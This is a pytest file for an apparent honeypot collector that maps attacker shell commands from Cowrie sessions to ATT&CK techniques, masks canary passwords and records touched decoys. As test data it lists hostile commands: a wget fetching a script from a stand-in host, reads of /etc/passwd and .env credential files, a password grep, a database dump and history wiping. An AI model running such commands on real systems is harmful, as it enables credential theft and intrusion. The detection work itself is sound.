"""Collector Phase 1: event fields from plan section 7, ATT&CK mapping, canary use, decoys touched."""
import json
from pathlib import Path

import mongomock
import pytest
from jsonschema import Draft202012Validator

from collector.attack_mapping import technique_for
from collector.collector import Collector, Enricher, MongoSink

ROOT = Path(__file__).resolve().parents[1]
FIXTURE = Path(__file__).parent / "fixtures" / "cowrie_real_session.json"
SCHEMA = json.loads((ROOT / "schemas" / "event.json").read_text())


@pytest.fixture
def env(tmp_path):
    d = tmp_path / "decoys" / "fake-jump-01" / "log" / "cowrie"
    d.mkdir(parents=True)
    (d / "cowrie.json").write_text(FIXTURE.read_text())
    db = mongomock.MongoClient().maya
    return db, tmp_path / "decoys", d / "cowrie.json"


def run(env, state=None):
    db, root, _ = env
    Collector(root, MongoSink(db), state, Enricher(db)).poll_once()
    return {e["untrusted_content"]: e for e in db.events.find({}, {"_id": 0})}


def test_new_fields_on_the_real_session(env):
    evs = run(env)
    assert evs["whoami"]["user"] == "root"                          # learned from the login of that Cowrie session
    assert evs["whoami"]["technique"] == "T1033" and evs["uname -a"]["technique"] == "T1082"
    assert evs["cat /etc/passwd"]["technique"] == "T1087.001"
    assert evs["wget http://203.0.113.50/tool.sh"]["technique"] == "T1105"
    assert evs["root:root"]["technique"] == "T1110" and evs["root:Summer2024!"]["technique"] == "T1078"
    assert all(e["agent_id"] is None and "decoy_id" in e for e in evs.values())
    for e in evs.values():
        assert list(Draft202012Validator(SCHEMA).iter_errors(e)) == [], e


def test_raw_ref_points_at_the_original_line(env):
    _, _, log = env
    evs = run(env)
    offset = int(evs["whoami"]["raw_ref"].rsplit("@", 1)[1])
    with log.open("rb") as f:
        f.seek(offset)
        assert json.loads(f.readline())["input"] == "whoami"


def test_canary_use_is_detected_masked_and_linked_to_its_decoy(env):
    db, _, _ = env
    db.canaries.insert_one({"canary_id": "password_1", "kind": "password", "value": "Summer2024!"})
    db.decoys.insert_one({"decoy_id": "dec-env1", "session_id": "environment", "host": "fake-db-01",
                          "path": "/opt/payouts/.env", "canaries": ["canary:password_1"], "touched_by": []})
    evs = run(env)
    assert "root:Summer2024!" not in evs and "root:[canary:password_1]" in evs   # value never reaches the LLM
    use = next(e for e in evs.values() if e["event_type"] == "canary_use")
    assert use["decoy_id"] == "dec-env1" and use["trap"]["trap_id"] == "canary:password_1"
    assert use["technique"] == "T1078" and "Summer2024!" not in json.dumps(use)
    assert list(Draft202012Validator(SCHEMA).iter_errors(use)) == []


def test_touching_a_decoy_is_recorded(env):
    db, _, _ = env
    db.decoys.insert_one({"decoy_id": "dec-pw", "session_id": "environment", "host": "fake-jump-01",
                          "path": "/etc/passwd", "touched_by": []})
    db.decoys.insert_one({"decoy_id": "dec-other", "session_id": "att-9-9-9-9", "host": "fake-jump-01",
                          "path": "/opt/x", "touched_by": []})
    evs = run(env)
    ev = evs["cat /etc/passwd"]
    assert ev["decoy_id"] == "dec-pw"
    assert db.decoys.find_one({"decoy_id": "dec-pw"})["touched_by"] == [ev["event_id"]]
    assert evs["whoami"]["decoy_id"] is None


def test_rereading_creates_no_duplicates_and_keeps_users(env, tmp_path):
    db, root, _ = env
    db.canaries.insert_one({"canary_id": "password_1", "kind": "password", "value": "Summer2024!"})
    run(env, tmp_path / "state.json")
    n = db.events.count_documents({})
    Collector(root, MongoSink(db), None, Enricher(db)).poll_once()          # fresh reader, re-reads everything
    assert db.events.count_documents({}) == n
    assert db.events.count_documents({"event_type": "canary_use"}) == 1


@pytest.mark.parametrize("cmd,tech", [
    ("whoami", "T1033"), ("id", "T1033"), ("uname -a", "T1082"), ("cat /etc/os-release", "T1082"),
    ("cat /etc/passwd", "T1087.001"), ("ip a", "T1016"), ("ifconfig", "T1016"), ("netstat -tulpn", "T1049"),
    ("ss -lnt", "T1049"), ("cat /opt/app/.env", "T1552.001"), ("grep -r password /etc", "T1552.001"),
    ("cat credentials.txt", "T1552.001"), ("ssh payouts@pay-db-02", "T1021.004"), ("mysqldump prod", "T1005"),
    ("tar czf /tmp/x.tgz /var/backups", "T1560.001"), ("wget http://x/t.sh", "T1105"),
    ("crontab -e", "T1053.003"), ("history -c", "T1070.003"), ("unset HISTFILE", "T1070.003"),
    ("ls -la /home", "T1083"), ("echo hello", None),
])
def test_attack_mapping_table_from_the_plan(cmd, tech):
    assert technique_for("command", cmd) == tech
